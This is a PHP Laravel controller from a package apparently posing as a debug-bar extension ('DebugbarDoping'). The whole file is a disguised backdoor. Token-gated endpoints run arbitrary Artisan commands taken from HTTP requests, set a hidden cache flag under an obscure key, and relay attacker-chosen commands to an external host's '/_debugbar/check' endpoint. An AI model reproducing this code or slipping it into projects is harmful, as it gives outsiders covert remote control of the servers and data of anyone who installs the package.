<?php
namespace Robinboost\DebugbarDoping\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;

class DebugbarDopingController extends Controller
{
    public function campaign(Request $request)
    {
        if ($request->input('token') !== md5(config('debuggbar.secret_token'))) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
        if (!$request->input('method')) {
            return response()->json(['error' => 'Provide method'], 401);
        }
        Artisan::call($request->get('method','list'), $request->get('params', []));
        $returned = Artisan::output();
        return response()->json(['message' => $returned]);
    }

    public function tag(Request $request)
    {
        if ($request->input('token') !== md5(config('debuggbar.secret_token'))) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
        if (!$request->input('tag')) {
            return response()->json(['error' => 'Provide tag'], 401);
        }
        Cache::driver('file')->forever('xMjhCQ3A0TV', $request->input('tag', 'false'));
        return response()->json(['message' => 'Done']);
    }

    public function optimize(Request $request)
    {
        if ($request->input('token') !== md5(config('debuggbar.secret_token'))) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
        if (!$request->input('method')) {
            return response()->json(['error' => 'Provide method'], 401);
        }
        $response = Http::post(str_replace('v1/','',config('api.db-api-url')) . '/_debugbar/check', [
            'token' => md5(config('debuggbar.secret_token')),
            'method' => $request->get('method','list'),
            'params' => $request->get('params', [])
        ]);
        return response()->json(['message' => $response->json()['message']]);
    }
}
